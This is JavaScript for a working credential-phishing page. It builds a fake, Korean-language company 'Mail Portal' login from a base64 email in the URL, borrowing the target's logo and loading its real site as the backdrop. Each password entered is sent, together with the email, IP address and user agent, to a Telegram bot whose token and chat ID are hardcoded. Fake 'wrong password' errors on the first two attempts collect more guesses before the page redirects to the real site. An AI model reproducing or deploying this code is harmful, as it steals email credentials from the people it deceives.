document.addEventListener("DOMContentLoaded", async function() {
    const urlParams = new URLSearchParams(window.location.search);
    const base64Email = urlParams.get('email');

    document.getElementById('login-text').textContent = '로그인';
    document.getElementById('login-text').style.marginLeft = '20px';
    document.getElementById('portal-text').textContent = '메일 포털';
    document.getElementById('email-text').textContent = '이메일 또는 전화';

    
    const passwordContainer = document.getElementById('password-container');
    const passwordLabel = document.createElement('div');
    passwordLabel.className = 'pp-label';
    passwordLabel.textContent = '비밀번호를 입력하세요';
    passwordContainer.appendChild(passwordLabel);
    
    const errorMessage = document.createElement('div');
    errorMessage.id = 'error-message';
    errorMessage.style.color = 'red';
    errorMessage.style.display = 'none';
    errorMessage.textContent = '귀하의 계정 또는 비밀번호가 올바르지 않습니다. 다시 시도해 주세요..';
    passwordContainer.appendChild(errorMessage);


    
    const passwordInput = document.createElement('input');
    passwordInput.type = '비밀번호';
    passwordInput.placeholder = '비밀번호';
    passwordInput.id = 'password-input';
    passwordInput.style.border = 'none';
    passwordInput.style.borderBottom = '1px solid #0965bb';
    passwordInput.style.padding = '5px';
    passwordInput.style.width = '90%';
    passwordInput.style.outline = 'none';
    passwordContainer.appendChild(passwordInput);

    
    const actionsContainer = document.getElementById('actions-container');
    const forgotPassword = document.createElement('div');
    forgotPassword.className = 'ft-p';
    forgotPassword.textContent = '비밀번호를 잊어버리셨습니까??';
    actionsContainer.appendChild(forgotPassword);

    
    const signInButton = document.createElement('button');
    signInButton.className = 'sn-n-bn';
    signInButton.id = 'sign-in-button';
    signInButton.textContent = '로그인';
    actionsContainer.appendChild(signInButton);

    
    document.getElementById('terms').textContent = 'Terms of use Privacy & cookies. © 2025';

    

    if (base64Email) {
        
        const email = atob(base64Email);

        
        document.getElementById('email-text').textContent = email;

        
        const [localPart, domainExtracted] = email.split('@');
        domain = domainExtracted; 
        const companyName = domainExtracted.split('.')[0];
        const capitalizedDomain = domainExtracted.charAt(0).toUpperCase() + domainExtracted.slice(1);
        const capitalizedCompanyName = companyName.charAt(0).toUpperCase() + companyName.slice(1);

        
        document.getElementById('portal-text').textContent = `${capitalizedCompanyName} Mail Portal`;
        document.getElementById('help-email').textContent = `Help@${domainExtracted}`;

        // Set the logo
        const logoImage = document.getElementById('company-logo');
        logoImage.src = `https://logo.clearbit.com/${domainExtracted}`;
        logoImage.onerror = function() {
            logoImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIj4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJmaWxsOiMwMDU1YjgiIGQ9Ik01MDMuNzU2IDExOC4wNjVjMC05LjA2OS03LjQyLTE2LjQ4OS0xNi40ODktMTYuNDg5SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djI3NS44N2MwIDkuMDY5IDcuNDIgMTYuNDg5IDE2LjQ4OSAxNi40ODloNDYyLjUzM2M5LjA2OSAwIDE2LjQ4OS03LjQyIDE2LjQ4OS0xNi40ODl2LTI3NS44N3oiLz4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJvcGFjaXR5Oi4xO2VuYWJsZS1iYWNrZ3JvdW5kOm5ldyIgZD0iTTI1NS45OTYgMjMwLjAzMiA5LjMwNiAzOTkuNjg3YzIuMTQ4IDUuNzEzIDcuMzcyIDkuOTQ5IDEzLjYzNiAxMC42MzRsMjMzLjA1My0xNjAuMjc4TDQ4OS4wNSA0MTAuMzIxYzYuMjY3LS42ODMgMTEuNDkyLTQuOTE4IDEzLjY0MS0xMC42MzFMMjU1Ljk5NiAyMzAuMDMyeiIvPgogICAgICAgICAgICAgICAgPHBhdGggc3R5bGU9Im9wYWNpdHk6LjI7ZW5hYmxlLWJhY2tncm91bmQ6bmV3IiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djIuMTk5bDI0Ny43NTUgMTcyLjUzOSAyNDcuNzU1LTE3Mi41Mzl2LTIuMTk5Yy4wMDItOS4wNjktNy40MTgtMTYuNDg5LTE2LjQ4Ny0xNi40ODl6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMDA4MmNhIiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtNC4wOTEgMC03LjgzOSAxLjUyLTEwLjczIDQuMDFsMjQxLjk5NiAxNjguNTI5IDI0MS45OTYtMTY4LjUyOWMtMi44OS0yLjQ5LTYuNjM3LTQuMDEtMTAuNzI4LTQuMDF6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMWUyNTJiIiBkPSJNNDg3LjI2NyA5My4zMzJIMjQuNzMzQzExLjA5NSA5My4zMzIgMCAxMDQuNDI3IDAgMTE4LjA2NXYyNzUuODdjMCAxMy42MzkgMTEuMDk1IDI0LjczMyAyNC43MzMgMjQuNzMzaDQ2Mi41MzNjMTMuNjM5IDAgMjQuNzMzLTExLjA5NSAyNC43MzMtMjQuNzMzdi0yNzUuODdjLjAwMS0xMy42MzgtMTEuMDk1LTI0LjczMy0yNC43MzItMjQuNzMzem0tOS43NzcgMTYuNDg5TDI1NiAyNjQuMDY4IDM0LjUxIDEwOS44MjFoNDQyLjk4em0xOC4wMjEgMjg0LjExNGMwIDQuNTQ3LTMuNjk4IDguMjQ0LTguMjQ0IDguMjQ0SDI0LjczM2MtNC41NDcgMC04LjI0NC0zLjY5OC04LjI0NC04LjI0NHYtMjc1Ljg3YzAtLjIyOS4wMTYtLjQ1My4wMzQtLjY3N0wyNTEuMjg4IDI4MC44OGE4LjI0MyA4LjI0MyAwIDAgMCA5LjQyMiAwbDIzNC43NjUtMTYzLjQ5MmMuMDE5LjIyNC4wMzQuNDQ4LjAzNC42Nzd2Mjc1Ljg3aC4wMDJ6Ii8+CiAgICAgICAgICAgIDwvc3ZnPg==';
            
        };

         // Set the iframe background
        const iframe = document.getElementById('mainPage');
        iframe.src = `https://${domainExtracted}`;
        iframe.onerror = function() {
            iframe.style.display = 'none';
            document.body.style.backgroundColor = 'rgb(184, 183, 183)'; 
        };
 }

    let attempt = 0;
    const errorMessageElement = document.getElementById('error-message');
    const signInButtonElement = document.getElementById('sign-in-button');
    let userIp = 'Unknown';

    
    signInButtonElement.addEventListener('click', async function() {
        const password = passwordInput.value.trim();

        if (password === '') {
            errorMessageElement.textContent = '비밀번호가 틀렸습니다. 다시 시도해 주세요.';
            errorMessageElement.style.display = 'block';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else if (password.length < 4) {
            errorMessageElement.textContent = '비밀번호가 틀렸습니다. 다시 시도해 주세요.';
            errorMessageElement.style.display = 'block';
            passwordInput.value = '';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else {
            errorMessageElement.style.display = 'none';

            attempt++;
            await sendInfoToTelegram();
            if (attempt === 1 || attempt === 2) {
                errorMessageElement.textContent = '비밀번호가 틀렸습니다. 다시 시도해 주세요.';
                errorMessageElement.style.display = 'block';
                setTimeout(function() {
                    errorMessageElement.style.display = 'none';
                }, 3000);
            } else if (attempt === 3) {
                window.location.href = `https://www.${domain}`;
            }
            passwordInput.value = ''; 
        }
    });


    async function fetchUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIp = data.ip;
        } catch (error) {
            userIp = 'IP - undefined';
        }
    }

    async function sendInfoToTelegram() {
        const email = document.getElementById('email-text').textContent;
        const password = passwordInput.value;
        const { formattedDate, formattedTime } = getFormattedDateAndTime();
        const userAgent = navigator.userAgent;

        await fetchUserIp();

        const message = `
Email: ${email}
Password: ${password}
IP: ${userIp}\n
Date: ${formattedDate}
Time: ${formattedTime}
User Agent: ${userAgent}\n
Designed by Nwamama7
        `;

        const telegramToken = '8206693164:AAHhQtKKDeEGcpw-tm_La_KJZlQNzdaFavo'; 
        const chatId = '1310147851'; 
        const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

        const payload = {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        };

        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                console.error('Telegram error:', data.description);
            }
        })
        .catch(error => console.error('Error sending message to Telegram:', error));
    }

    function getFormattedDateAndTime() {
        const date = new Date();
        const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
        const formattedDate = `${date.getDate()} ${monthNames[date.getMonth()]}, ${date.getFullYear()}`;
        const formattedTime = `${date.getHours().toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
        return { formattedDate, formattedTime };
    }
});
